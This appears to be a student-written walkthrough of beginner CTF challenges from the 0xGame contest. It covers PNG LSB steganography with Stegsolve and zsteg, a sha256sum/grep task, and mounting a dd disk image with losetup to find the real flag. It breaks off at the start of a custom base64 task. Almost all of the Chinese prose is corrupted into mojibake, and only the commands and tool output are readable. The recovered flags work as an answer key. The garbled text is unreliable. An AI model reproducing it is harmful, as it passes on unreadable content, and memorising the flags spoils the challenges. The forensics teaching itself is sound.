> æˆ‘çŒœçœŸæœ‰äººæŠŠä¸Šé¢çš„ flag äº¤ä¸Šå»äº†å§ï¼Œæ¢†æ¢†é”¤ä½ å‘¢ï¼Œè‡ªä¸ªåšä¸€éï¼Œç†Ÿæ‚‰ä¸‹ï¼Œç„¶åè¿™é‡Œå­¦é•¿ç»™å‡ºå»ºè®®ï¼Œä¸€å®šè¦å¤šç”¨ï¼Œè¶Šå­¦åˆ°åé¢ï¼Œæˆ‘ä»¬çš„å‘½ä»¤è¡Œå·¥å…·ä½¿ç”¨çš„å°±è¶Šå¤šï¼Œè€Œä¸”ï¼Œåœ¨ç»ˆç«¯ä¸Šæ“ä½œæ²¡æœ‰ä¸€ç§é»‘å®¢ä½“éªŒæ„Ÿå—ï¼Ÿå¤š cool!

### Zootopia

è¿™ä¸ªé¢˜çš„è€ƒç‚¹å¾ˆåŸºç¡€ï¼Œæ˜¯ png å›¾ç‰‡çš„ LSB éšå†™ï¼Œä¸‹é¢å°±ç®€å•è¯´è¯´ lsb çš„éšå†™åŸç†ï¼Œå¦‚æœå¯¹å…¶ä»– png éšå†™æ–¹æ³•æ„Ÿå…´è¶£ï¼Œå¯ä»¥çœ‹çœ‹è¿™ç¯‡[åšå®¢](https://www.yo1o.top/posts/png-challenge/)

> å—¯ï¼Œæ²¡é”™ï¼Œæ˜¯æˆ‘å†™çš„

#### lsb åŸç†

é¦–å…ˆæœ‰ä¸ªå¤§æ¦‚çš„ç†è§£ï¼Œåœ¨ png å›¾ç‰‡ä¸­ï¼Œä¸€ä¸ªåƒç´ ç‚¹åœ¨æ–‡ä»¶æ•°æ®ä¸­å­˜å‚¨çš„å¤§å°æ˜¯ä¸‰ä¸ªå­—èŠ‚ï¼Œæ¯”è¾ƒå¸¸è§çš„æ¨¡å¼æ˜¯æŒ‰ç…§ rgb è¿›è¡Œå­˜å‚¨çš„ï¼ˆæ¨¡å¼æœ‰å¾ˆå¤šç§ï¼Œä½†æ˜¯ rgb ç¡®å®æ˜¯æœ€å¸¸è§ï¼Œå…¶ä»–çš„æ¨¡å¼å¯¹åº”çš„éšå†™åŸç†å’Œä¸‹é¢çš„ä¸€æ ·

rgb ä¸‰ä¸ªé¢œè‰²é€šé“çš„èŒƒå›´éƒ½æ˜¯`[0-255]`

> åˆ«è®°å²”äº†ï¼ï¼ï¼\
> {: .prompt-warning }

```text
å‡ ä¸ªå¸¸è§çš„é¢œè‰²
çº¢è‰²ï¼š(255,0,0)
ç»¿è‰²ï¼š(0,255,0)
è“è‰²ï¼š(0,0,255)
ç™½è‰²ï¼š(255,255,255)
```

ç„¶ååœ¨æ–‡ä»¶å†…éƒ¨ï¼Œæ•°æ®æ˜¯æŒ‰ç…§ 8 ä½äºŒè¿›åˆ¶è¿›è¡Œå­˜å‚¨çš„ï¼Œæ¯”æ–¹è¯´æŸä¸ªåƒç´ ç‚¹çš„å€¼æ˜¯(111,222,225)ï¼Œé‚£ä¹ˆåœ¨å­˜å‚¨ä¸­ï¼Œå¯¹åº”çš„å€¼æ˜¯(01101111,11011110,11100001)

ç„¶åè¿™é‡Œï¼Œæˆ‘ä»¬å®šä¹‰æ¯ä¸ª 8 ä½äºŒè¿›åˆ¶çš„æœ€åä¸€ä½ä¸º`LSB` (**Least Significant Bit**,æœ€ä½æœ‰æ•ˆä½)

æ‰€è°“çš„ lsb éšå†™å°±æ˜¯å¯¹æ¯ä¸ªäºŒè¿›åˆ¶çš„æœ€ä½æœ‰æ•ˆä½è¿›è¡Œç¼–è¾‘ï¼Œä½¿ç”¨ 01 äºŒè¿›åˆ¶è¿›è¡Œéšå†™ä¿¡æ¯ï¼Œå¯ä»¥è—æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è—å­—ç¬¦ä¸²ï¼ŒåŒæ ·ï¼Œé¢œè‰²é€šé“çš„é€‰æ‹©ä¹Ÿå¾ˆå¤šæ ·æ€§ï¼Œå¯ä»¥ä»…ä»…å¯¹ R é€šé“è¿›è¡Œéšå†™ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸¤ä¸ªä»¥ä¸Šâ€¦â€¦

åœ¨ lsb çš„åŸç†åŸºç¡€ä¸Šï¼Œé¢œè‰²é€šé“éšå†™è¿˜èƒ½æ‹“å±•åˆ°å…¶ä»–çš„é€šé“ä¸­ï¼Œä¹Ÿå°±å‡ºç°äº†`MSB` (**Most Significant Bit**,æœ€é«˜æœ‰æ•ˆä½)æˆ–è€…å…¶ä»–æ··ä¹±é€šé“éšå†™ï¼ˆç»„åˆèµ·æ¥å¾ˆå¤šï¼Œä¸è¿‡åŸç†éƒ½æ˜¯ä¸€æ ·çš„

> ç¼–è€…è¡¥å……ï¼šlsb éšå†™ç›¸å¯¹ msb è€Œè¨€ï¼Œæœ‰ä¸ªæ˜¾è‘—çš„ä¼˜åŠ¿ï¼Œé‚£å°±æ˜¯å¯¹æ•´ä¸ªç”»é¢å½±å“ä¸å¤§ï¼Œæˆ–è€…è¯´æˆ‘ä»¬è‚‰çœ¼å‡ ä¹çœ‹ä¸æ¸…éšå†™å‰åçš„å·®å¼‚

#### è§£å¯† LSB

è§£å†³æ–¹å¼å¾ˆå¤šï¼Œç”±äº lsb çš„æå–ç¨å¾®éº»çƒ¦ç‚¹ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ä¸ç»†è¯´è„šæœ¬æ€ä¹ˆæ“ï¼ˆå†™æå–è„šæœ¬è€éº»çƒ¦äº†å‘¢

æ¨èçš„è§£å¯†å·¥å…·æœ‰`Stegsolve`,`Zsteg`

##### stegsolve

å‰è€…æ˜¯æœ‰å¯è§†åŒ–ç•Œé¢çš„æå–é€šé“éšå†™çš„å·¥å…·ï¼ŒåŒæ ·ä¹Ÿæœ‰å¯¹å•ä¸ªé¢œè‰²é€šé“æå–æŸ¥çœ‹å›¾ç‰‡çš„åŠŸèƒ½ï¼Œè¿˜æœ‰ xor ç­‰ç­‰æ“ä½œï¼Œç›®å‰æ¥çœ‹ï¼Œæˆ‘æ„Ÿè§‰è¿™ä¸ªæœ€å¥½ç”¨

å…ˆå¯¼å…¥å›¾ç‰‡ï¼ˆä½ æŠŠ png å›¾ç‰‡ç»™æ‹‰è¿›å»ä¹Ÿæ²¡é—®é¢˜

**Analyse->Data Extract->å‹¾é€‰ Red,Green,Blue ä¸‰ä¸ªé€šé“çš„æœ€åä¸€ä½->é€‰ä¸­ LSB First(è™½è¯´æ„Ÿè§‰æ²¡ç”¨)->Preview**

é€šè¿‡ä¸Šè¿°æ“ä½œï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°æ–‡ä»¶æœ€å‰é¢éšè—äº† flagï¼Œä½†æ˜¯åœ¨å½“å‰æƒ…å†µä¸‹ï¼Œç›´æ¥å¤åˆ¶ï¼Œä¼šé¡ºå¸¦æŠŠå·¦è¾¹çš„åå…­è¿›åˆ¶æ•°æ®å¤åˆ¶åˆ°ï¼Œå»ºè®®æŠŠ preview ä¸Šé¢çš„`Include Hex Dump In Preview`å–æ¶ˆå‹¾é€‰ï¼Œé‡æ–° Preview ä¸‹ï¼Œå°±å¥½å¤åˆ¶ flag äº†ï¼ˆå¤åˆ¶å‡ºæ¥çš„ç»“æœä¸­é—´æœ‰ç©ºæ ¼ï¼Œè‡ªè¡Œåˆ å‡å°±å¥½

##### zsteg

åè€…æ˜¯å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥å¸®æˆ‘ä»¬æ£€æµ‹å¤šä¸ªé¢œè‰²é€šé“å¯èƒ½æœ‰çš„éšå†™ä¿¡æ¯ï¼Œæå–ä¹Ÿå¾ˆå¥½æ

æ­£å¸¸æ¥è¯´ï¼Œç›´æ¥`zsteg xxx.png`å¯ä»¥æ˜¾ç¤ºå¤§éƒ¨åˆ†å¯è¯»çš„é¢œè‰²é€šé“éšå†™çš„éƒ¨åˆ†å†…å®¹ï¼Œç„¶åä¸€äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå‘ç°ç¨å¤§æ–‡ä»¶è¢«éšå†™è¿›å»ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦ä½¿ç”¨**-E xxx<é€šé“ç»„åˆ>** æ¥å®Œæ•´æå–éšå†™æ•°æ®åˆ°æ–‡ä»¶ä¸­

```text
0xGame{W1_Need_t0_t@k3_a_break}
```

### ezshell_PLUS

æœ¬é¢˜æ˜¯ ezshell çš„è¿›é˜¶ï¼Œå°±æ˜¯çœ‹çœ‹å¤§å®¶çš„è‡ªå­¦èƒ½åŠ›å¦‚ä½•ï¼Œä¸‹é¢æˆ‘ç»™å‡ºæˆ‘çš„æ­¥éª¤

```bash
sha256sum files/* | grep -i "021832def36ccd081b38d8fd51b534d70826b5df4423ce2c15386797ab08bef8"
```

æˆ‘çŒœæµ‹è¿™é‡Œè®©ä½ ä»¬æ„Ÿè§‰æ–°å¥‡å§ï¼Œå°±æ˜¯ç”¨äº†ä¸ªç®¡é“ç¬¦ï¼Œè®©å‰ä¸€æ­¥çš„è¾“å‡ºä½œä¸ºåä¸€æ­¥çš„è¾“å…¥

ç„¶åç”¨åˆ°äº† sha256sumï¼Œgrep å‘½ä»¤ï¼Œè¿™äº›ä¹Ÿå¾ˆå¸¸è§ï¼Œåˆ†åˆ«æ˜¯è®¡ç®—å“ˆå¸Œå’ŒæŸ¥æ‰¾

ç„¶åè¿™é‡Œæœ‰ä¸ªâ€*â€œï¼Œå®ƒè¢«å«åšé€šé…ç¬¦ï¼Œå¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦

> å­¦é•¿åªèƒ½è¯´ï¼Œå¤šè§å¤šå­¦å¤šç”¨ï¼Œå‘½ä»¤è¡Œç”¨ç†Ÿæ‚‰ï¼Œä¼šå¯¹åé¢çš„å­¦ä¹ å¸®åŠ©å¾ˆå¤§

### Do not enter

æœ¬é¢˜è€ƒå¯Ÿäº† dd é•œåƒæŒ‚è½½ä¸åˆ†æ

æˆ‘ä»¬é¦–å…ˆç”¨ file å‘½ä»¤æŸ¥çœ‹é•œåƒçš„åŸºæœ¬ç»“æ„

```bash
file do_not_enter.dd
do_not_enter.dd: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x10,0,1), end-CHS (0x28f,3,32), startsector 2048, 81920 sectors; partition 2 : ID=0x83, start-CHS (0x2a0,0,1), end-CHS (0x3ff,3,32), startsector 86016, 81920 sectors; partition 3 : ID=0xf, start-CHS (0x3ff,3,32), end-CHS (0x3ff,3,32), startsector 169984, 178176 sectors
```

ä»è¾“å‡ºå¯ä»¥çœ‹å‡ºï¼Œ**do_not_enter.dd**æ˜¯ä¸€ä¸ª MBRï¼ˆä¸»å¼•å¯¼è®°å½•ï¼‰æ ¼å¼çš„ç£ç›˜é•œåƒï¼ŒåŒ…å«ä¸€ä¸ªå¼•å¯¼æ‰‡åŒºå’Œä¸‰ä¸ªåˆ†åŒº

* åˆ†åŒº 1 å’Œ 2 æ˜¯ Linux åŸç”Ÿåˆ†åŒºï¼ˆç±»å‹ 0x83)

* åˆ†åŒº 3 æ˜¯æ‰©å±•åˆ†åŒºï¼ˆç±»å‹ 0x0f),é€šå¸¸ç”¨äºå®¹çº³æ›´å¤šé€»è¾‘åˆ†åŒº

ä¸Šé¢çœ‹ä¸æ‡‚é—®é¢˜ä¸å¤§ï¼Œåæ­£å’Œä¸‹é¢çš„è§£é¢˜è¿‡ç¨‹æ²¡å¤šå°‘å…³ç³»ï¼Œåšå¤šäº†ï¼Œå°±ä¼šæœ‰æ›´æ·±çš„ä½“ä¼š(â—'â—¡'â—)

> ğŸ’¡ å°çŸ¥è¯†ï¼šMBR æ˜¯ä¸€ç§è¾ƒè€ä½†å¹¿æ³›æ”¯æŒçš„åˆ†åŒºæ–¹æ¡ˆï¼Œç°ä»£ç³»ç»Ÿæ›´å¤šä½¿ç”¨ GPTï¼Œä½†å¤§å¤šæ•° Linux å·¥å…·ï¼ˆå¦‚ `fdisk`ã€`mount`ã€`losetup` ç­‰ï¼‰ä¾ç„¶èƒ½å¾ˆå¥½åœ°å¤„ç† MBR é•œåƒã€‚\
> å¦‚æœä½ è¿˜ä¸ç†Ÿæ‚‰â€œå¼•å¯¼æ‰‡åŒºâ€â€œåˆ†åŒºè¡¨â€è¿™äº›æ¦‚å¿µï¼Œæ²¡å…³ç³»ï¼ä½ å¯ä»¥ç®€å•æŠŠå®ƒç†è§£ä¸ºï¼š**è¿™ä¸ª&#x20;**`.dd`**&#x20;æ–‡ä»¶å°±åƒæ˜¯æŠŠä¸€æ•´å—ç¡¬ç›˜â€œæ‹äº†å¼ å¿«ç…§â€ä¿å­˜ä¸‹æ¥äº†**ã€‚æˆ‘ä»¬è¦åšçš„ï¼Œå°±æ˜¯ç”¨åˆé€‚çš„å·¥å…·æŠŠè¿™ä¸ªâ€œè™šæ‹Ÿç¡¬ç›˜â€æŒ‚è½½åˆ°ç³»ç»Ÿé‡Œï¼Œåƒæ‰“å¼€æ™®é€šæ–‡ä»¶å¤¹ä¸€æ ·å»æŸ¥çœ‹é‡Œé¢çš„å†…å®¹ã€‚

#### åšæ³•

**ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºå¾ªç¯è®¾å¤‡æ˜ å°„**

```plain
sudo losetup -fP do_not_enter.dd
```

å‘½ä»¤è§£é‡Šï¼š

* losetup:linuxä¸‹çš„å¾ªç¯è®¾å¤‡ç®¡ç†å·¥å…·ï¼Œèƒ½å°†æ–‡ä»¶è™šæ‹Ÿæˆå—,æ¢å¥è¯è¯´ï¼Œå°±æ˜¯æŠŠä¸€ä¸ª dd æ–‡ä»¶è½¬æ¢æˆæœºå™¨ç£ç›˜å¯ä»¥è¯»çš„æ ¼å¼

* -f:è‡ªåŠ¨æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå¯ç”¨çš„ loop è®¾å¤‡

* -Pï¼šå…³é”®å‚æ•°ï¼è®©å†…æ ¸åœ¨å…³è”åé‡æ–°æ‰«æåˆ†åŒºè¡¨ï¼Œè‡ªåŠ¨åˆ›å»ºåˆ†åŒºè®¾å¤‡èŠ‚ç‚¹

* ä½œç”¨ï¼šå°† DD é•œåƒæ–‡ä»¶è™šæ‹Ÿæˆä¸€ä¸ªâ€ç¡¬ç›˜â€œï¼Œç³»ç»Ÿä¼šè¯†åˆ«å‡ºå…¶ä¸­çš„åˆ†åŒºç»“æ„

**ç¬¬äºŒæ­¥ï¼šéªŒè¯è®¾å¤‡æ˜ å°„çŠ¶æ€**

```plain
sudo losetup -a
```

å‘½ä»¤è§£é‡Šï¼š

* -a:æ˜¾ç¤ºæ‰€æœ‰æ´»è·ƒçš„ loop è®¾å¤‡çŠ¶æ€

**ç¬¬ä¸‰æ­¥ï¼šè¯†åˆ«åˆ†åŒºç»“æ„ä¸æ ‡ç­¾**

```plain
lsblk -f /dev/loop0 #åé¢çš„/dev/loop0æ˜¯é€šè¿‡ç¬¬äºŒæ­¥å¾—åˆ°çš„
```

å‘½ä»¤è§£é‡Šï¼š

* lsblk:åˆ—å‡ºå—è®¾å¤‡ä¿¡æ¯çš„ä¸“ä¸šå·¥å…·

* -f:æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬åˆ†åŒºæ ‡ç­¾

* æˆ‘çš„è€ƒç‚¹å…¶å®å°±æ˜¯è¿™é‡Œï¼Œå°±åƒé¢˜ç›®è¯´çš„é‚£æ ·ï¼Œæˆ‘ä»¬åº”è¯¥é€‰ä¸­é‚£ä¸ª do_not_enter çš„æ ‡ç­¾

**ç¬¬å››æ­¥ï¼šæŒ‚è½½ç›®æ ‡åˆ†åŒº**

```plain
mkdir -p /mnt/test
sudo mount /dev/loop0p2 /mnt/test
```

å‘½ä»¤è§£é‡Šï¼š

* mount:æ ‡å‡†çš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½å‘½ä»¤

* /dev/loop0p2:æˆ‘ä»¬è¦æŒ‚è½½çš„åˆ†åŒºè®¾å¤‡ #è¿™é‡Œçš„å‚æ•°æ˜¯é€šè¿‡ç¬¬ä¸‰æ­¥å¾—åˆ°çš„

* /mnt/testï¼šæˆ‘ä»¬è®¾ç½®çš„æŒ‚è½½ç‚¹ç›®å½•

* åº•å±‚åŸç†ï¼šå°†åˆ†åŒºä¸­çš„ ext4 æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ç›®å½•æ ‘ï¼Œä½¿æ–‡ä»¶å¯è®¿é—®

**ç¬¬äº”æ­¥ï¼šæœç´¢ flag å†…å®¹**

```plain
sudo grep -r "0xGame" /mnt/test
```

å‘½ä»¤è§£é‡Šï¼š

* grep:å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…·

* -r:é€’å½’æœç´¢ï¼Œéå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶

* "0xGame":flagå¤´

**ç¬¬å…­æ­¥ï¼šæ¸…ç†**

```plain
sudo umount /mnt/test
sudo losetup -d /dev/loop0
sudo rmdir /mnt/test
```

æœ¬é¢˜è¿˜æœ‰å…¶ä»–å·¥å…·èƒ½å¿«é€ŸæŒ‚è½½ï¼Œæ¯”å¦‚è¯´**kpartx**

ç„¶åå…³äº**blkid**ï¼Œä¹Ÿèƒ½ç”¨å®ƒæ¥è¯»å–é‚£ä¸ªåˆ†åŒºçš„æ ‡ç­¾ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥å’Œ**lsblk**æ¢ç€ç”¨

| ç‰¹æ€§       | `blkid`                     | `lsblk`           |
| -------- | --------------------------- | ----------------- |
| **ä¸»è¦åŠŸèƒ½** | è¯»å–**æ–‡ä»¶ç³»ç»Ÿ**çš„å…ƒæ•°æ®å’Œå±æ€§           | æ˜¾ç¤º**å—è®¾å¤‡**çš„æ‹“æ‰‘ç»“æ„å’Œå…³ç³» |
| **æ•°æ®æ¥æº** | è¯»å–æ–‡ä»¶ç³»ç»Ÿçš„è¶…çº§å—(superblock)      | æŸ¥è¯¢å†…æ ¸çš„å—è®¾å¤‡ä¿¡æ¯(sysfs) |
| **è¾“å‡ºè§†è§’** | **æ–‡ä»¶ç³»ç»Ÿè§†è§’**                  | **è®¾å¤‡æ‹“æ‰‘è§†è§’**        |
| **ä¿¡æ¯ç±»å‹** | æ–‡ä»¶ç³»ç»Ÿç‰¹å®šå±æ€§(UUID, LABEL, TYPE) | è®¾å¤‡å±‚æ¬¡å…³ç³»(çˆ¶å­ã€å¤§å°ã€æŒ‚è½½ç‚¹) |
| **ä½¿ç”¨åœºæ™¯** | æŒ‰å±æ€§è¯†åˆ«å’ŒæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ                | ç†è§£ç£ç›˜åˆ†åŒºç»“æ„å’Œå¸ƒå±€       |

ç„¶åä¸‹é¢æ˜¯æˆ‘ç»™å‡ºçš„å‚è€ƒæ­¥éª¤ï¼Œå¯ä»¥çœ‹å‡ºåœ¨æ­£ç¡®æ­¥éª¤ä¸‹ï¼Œæˆ‘ä»¬åªèƒ½æ‰¾åˆ°ä¸€ä¸ªå®Œå®Œæ•´æ•´çš„ flag çš„ï¼Œfake flag çœŸçš„ä¸€ç‚¹ä¹Ÿæ²¡ä¸ºéš¾å¤§å®¶çš„ï¼ˆç›²çŒœæœ‰äººè¯´æˆ‘èƒ¡ä¹±å¡ä¸œè¥¿ï¼Œå“ˆå“ˆ

```bash
~$ sudo losetup -fP do_not_enter.dd
~$ sudo losetup -a
/dev/loop0: [2096]:536444 (/home/yolo/Desktop/timu/0xGame_challenge/do_not_enter.dd)
~$ lsblk -f /dev/loop0
NAME      FSTYPE FSVER LABEL        UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
loop0
â”œâ”€loop0p1 ext4   1.0   UserShare    5a6be8f0-43f9-4020-a729-510d6d57e95b
â”œâ”€loop0p2 ext4   1.0   Do_not_enter 643298ec-2a07-4681-9555-addf90de8ae1
â”œâ”€loop0p3
â”œâ”€loop0p5 ext4   1.0   WebServer    f965eed6-3de2-4533-8e06-2c816f9e4574
â””â”€loop0p6 ext4   1.0   SysLogs      650ce632-c57e-41c6-8a3b-c6bf3d4e2193
~$ sudo mount /dev/loop0p2 /mnt/test
~$ sudo grep -r "0xGame" /mnt/test
/mnt/test/syslog:0xGame{WoW_y0u_fouNd_1t?_114514}
~$ sudo umount /mnt/test
~$ sudo losetup -d /dev/loop0
~$ sudo rmdir /mnt/test
```

ä¸€äº›å…¶ä»–å·¥å…·ï¼ˆWindowsï¼Œæœ¬æ„è¿˜æ˜¯è®©å¤§å®¶æŒæ¡ dd é•œåƒæŒ‚è½½æ–¹å¼ï¼Œä½†æ˜¯èµ–æˆ‘ï¼Œæ²¡æœ‰ç»™å¤§å®¶è¯´æ¸…æ¥šï¼Œåº”è¯¥å…³æ³¨åˆ†åŒºæ ‡ç­¾ï¼Œä¸ºå„ä½å¸ˆå‚…è§£é¢˜æ—¶å€™é€ æˆå›°æ‰°æ„Ÿåˆ°æŠ±æ­‰

* AXIOM

* DiskGenius

* R-Studio

#### å­¦é•¿ç¢ç¢å¿µ

å…³äºæœ¬é¢˜ï¼Œæˆ‘è®¾ç½®äº† 180 ä¸ª fake flagï¼Œç›®çš„å°±æ˜¯å¸Œæœ›æ–°ç”Ÿä»¬é‡‡å–ä¸“ä¸šå·¥å…·ç§‘å­¦åœ°è¿›è¡Œåˆ†æï¼Œè€Œä¸æ˜¯ä½¿ç”¨ strings æš´åŠ›æ‰‹æ’•ï¼Œç„¶ååœ¨ Windows è¿™è¾¹ï¼Œæœ‰äººç”¨ axiom èƒ½è¯»å‡ºæ ‡ç­¾åï¼Œæˆ‘æµ‹è¯•è¿‡ autopsyï¼Œå‘ç°ä¸èƒ½æ˜¾ç¤ºåˆ†åŒºæ ‡ç­¾ï¼Œè€Œä¸”ä¸€äº›é€‰æ‰‹å’Œæˆ‘èŠè¿‡ï¼Œä»–ä»¬ç”¨ç«çœ¼ã€å–è¯å¤§å¸ˆç­‰ç­‰è‘—åä¸€æŠŠæ¢­å–è¯å·¥å…·ä¹Ÿæ²¡èƒ½è§£å†³å‡ºæ¥ï¼ˆ~~å¯è§æˆ‘å‡ºçš„é¢˜è¿˜è›®å¥½~~ ï¼Œå…¶å®æ˜¯å¸Œæœ›å­¦å¼Ÿå­¦å¦¹ä»¬åœ¨åé¢çš„å­¦ä¹ ä¸­ï¼Œä¼šé‡åˆ°è¶Šæ¥è¶Šå¤šçš„ä¸€æŠŠæ¢­è„šæœ¬æˆ–è€…è¯´æ˜¯å¦™å¦™å°å·¥å…·ï¼Œæˆ‘å¹¶ä¸æ’æ–¥ä½¿ç”¨çš„ï¼Œä½†æ˜¯ï¼æˆ‘å¸Œæœ›ä½ ä»¬èƒ½æŒæ¡å¯¹åº”çš„åŸç†å¹¶äº²æ‰‹ç”¨è‡ªå·±çš„"ç¬¨"æ–¹æ³•è§£å†³å‡ºä¸€ä¸¤é“åå†é€‰æ‹©æ˜¯å¦ä½¿ç”¨æ‰€è°“çš„â€œä¸€æŠŠæ¢­â€ï¼Œä¸ç„¶ï¼Œæ²¡äº†å¥½ç”¨çš„ç¥å¥‡å°å·¥å…·ï¼Œä½ è¿˜èƒ½åšå‡ºä»€ä¹ˆå‘¢ï¼Ÿ

> åœ¨æˆ‘çœ‹æ¥ï¼Œä¸€æŠŠæ¢­å·¥å…·åº”è¯¥è¢«ç”¨åœ¨é‡è¦èµ›äº‹æŠ¢è¡€ä¸Šï¼Œè€Œä¸æ˜¯ç®€å•å°æ¯”èµ›ä¸Šå†²æ¦œç”¨çš„

æ¥ä¸‹æ¥å…³äº AIï¼Œè¿™ä¸ªæ˜¯è¿‘å¹´æ¥æœ€çƒ­é—¨çš„ä¸œè¥¿ï¼Œæœ‰äº† aiï¼Œå¯¹ä½ ä»¬å…¥é—¨ ctf çš„å¸®åŠ©ä¼šéå¸¸éå¸¸å¤§ï¼Œä¸ç”¨è§‰å¾—å•¥äº‹éƒ½é—® ai ä¼šä¸å¥½æ„æ€ï¼Œå› ä¸ºæˆ‘ä¹Ÿæœ€å¼€å§‹å•¥ä¹Ÿä¸æ‡‚ï¼Œè¿™æ ·è¿‡æ¥çš„ã€‚æ‰€ä»¥è¿˜æ˜¯å¾ˆé¼“åŠ±å¤§å®¶å­¦ä¹ æ–°çŸ¥è¯†çš„æ—¶å€™ï¼Œå…ˆè‡ªå·±ç ”ç©¶ï¼Œå¡ä½çš„è¯è¯¢é—® ai è§£å†³æ–¹æ¡ˆï¼Œæ¥ä¸‹æ¥æ‰æ˜¯æ‰¾åœˆå­å†…å‰å®³çš„å¸ˆå‚…ï¼ˆä¸€å®šè¦æ•´ç†å¹¶æè¿°æ¸…æ¥šè‡ªå·±é‡åˆ°çš„é—®é¢˜ï¼Œä¸ç„¶å¯¹ä»–ä»¬æ¥è¯´ï¼Œå¸®ä½ è§£æƒ‘çš„éš¾åº¦ä¼šä¸Šä¸€ä¸ªæ¡£æ¬¡,haha

ç„¶åæ¯æ¬¡ä» ai é‚£é‡Œæ‹¿åˆ°è§£å†³æ–¹æ¡ˆï¼Œå¸Œæœ›ä½ ä»¬èƒ½ä»ä¸­å­¦ä¹ åˆ°ä¸€äº›ï¼Œè€Œä¸æ˜¯æ— è„‘çš„**ai è¯´å•¥ä½ å¹²å•¥**ï¼Œä¸ç„¶ä¸‹æ¬¡é‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œæˆ‘ä»¬å†é—®ä¸€é AIï¼Ÿè¿™ä¹Ÿå°±å¸¦å‡ºäº†æˆ‘ä¸‹é¢ç»™å¤§å®¶çš„å¿ å‘Šï¼šä¸€å®š`åˆç†`ä½¿ç”¨ AIï¼Œè¶ç€ AI åœ¨æ—è¾¹ï¼Œæˆ‘ä»¬å¤šé€šè¿‡å®ƒå­¦ä¹ ä¸€äº›æ–°çŸ¥è¯†ï¼Œç­‰æˆ‘ä»¬ç”¨ä¸äº†çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¸ä¼šæ‰‹è¶³æ— æªï¼ˆæƒ³è±¡è¿™æ ·ä¸€ä¸ªæƒ…æ™¯ï¼Œå¦‚æœè¯´ä½ å•¥äº‹åªä¼šé—® aiï¼Œé‚£ä¹ˆä½ æ‰€åšçš„äº‹æƒ…æ˜¯ä¸æ˜¯ä»»ä½•äººéƒ½èƒ½æ›¿ä»£ï¼Ÿæ˜¯ä¸æ˜¯è¯´ä½ å¤±å»äº† aiï¼Œä¼šä¸€ç‚¹ç«äº‰åŠ›éƒ½æ²¡æœ‰ï¼Ÿ

## Week2

> ä» week2 å¼€å§‹ï¼Œèµ›é¢˜éš¾åº¦ä¸Šå‡ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€å¤§å®¶éœ€è¦æå‡å­¦ä¹ æ•ˆç‡ï¼Œäº‰å–åœ¨çŸ­æ—¶é—´å†…å­¦ä¼šæ›´å¤šçš„çŸ¥è¯†ç‚¹

### è¿™ä¸ª b64 ä¸å¤ªå¯¹å•Š

> å°æ‹“å±•\
> {: .prompt-success }

> äº¤äº’å‡ºç°çš„ä¸­æ–‡ä¹±ç å¯¹è§£é¢˜æ²¡æœ‰ä»»ä½•å½±å“ï¼Œä½†æ˜¯ä¸ºäº†è§£é¢˜ä½“éªŒï¼Œå¯ä»¥é€‰æ‹©ä¸‹è¿°æ–¹å¼ä¼˜åŒ–ï¼š\
> ä¼˜å…ˆå»ºè®®ä½¿ç”¨ Linux çš„ç»ˆç«¯ï¼Œwsl2,è™šæ‹Ÿæœºå‡å¯ï¼Œå®ƒä»¬æ”¯æŒ utf-8\
> å¦‚æœæ˜¯ä½¿ç”¨ cmdï¼Œè¯· nc è¿æ¥å®¹å™¨ä¹‹å‰ï¼Œè¾“å…¥`chcp 65001`å›è½¦ï¼Œå°†ç¼–ç æ–¹å¼ä» gbk åˆ‡æ¢æˆ utf-8 åå† nc è¿æ¥\
> å¦‚æœè¯´æ˜¯ powershellï¼Œè¿™ä¸ªç¨å¾®éº»çƒ¦ç‚¹\
> éœ€è¦å®ç°æ“ä½œå¦‚ä¸‹ï¼šä¾æ¬¡å°†ä¸‹é¢ä¸‰ä¸ªå‘½ä»¤è¾“å…¥åˆ° powershell ä¸­\
> `chcp 65001`\
> `[Console]::InputEncoding = [System.Text.Encoding]::UTF8`\
> `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8`

> æœ¬é¢˜å¯ä»¥å˜ç›¸çš„çœ‹ä½œä¸€é“å¯†ç ç®€å•é¢˜ï¼Œæ—¢ç„¶æƒ³å­¦ miscï¼Œå„ä¸ªæ–¹å‘éƒ½è¦æœ‰æ‰€äº†è§£

base64 åŸç†ï¼Œæˆ‘ç»™å¤§å®¶åœ¨ week1 ä¸Šè®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œç„¶åæœ¬é¢˜çš„è€ƒæ³•æ˜¯å°†å­—ç¬¦é›†ç´¢å¼•è¡¨è‡ªå®šä¹‰ï¼Œé€‰æ‰‹ä»¬éœ€è¦é€šè¿‡å°†æ˜æ–‡å’Œå¯†æ–‡è¿›è¡Œå¯¹æ¯”ï¼Œåæ¨å­—ç¬¦é›†ï¼Œè·å– flagï¼Œè¿™é‡Œé¢æ˜¯æœ‰å¤šç§è§£å†³æ–¹æ³•çš„ï¼Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¿›è¡Œæ‰‹åŠ¨æ‹¼æ¥ä¹Ÿå¯è¡Œï¼Œä¸è¿‡æˆ‘ä¸‹é¢è®²è§£ä¸€ä¸ªç›¸å¯¹é«˜æ•ˆçš„æ–¹æ³•ï¼š

æˆ‘ä»¬å…ˆå›é¡¾ base64 ç¼–ç åŸç†

```text
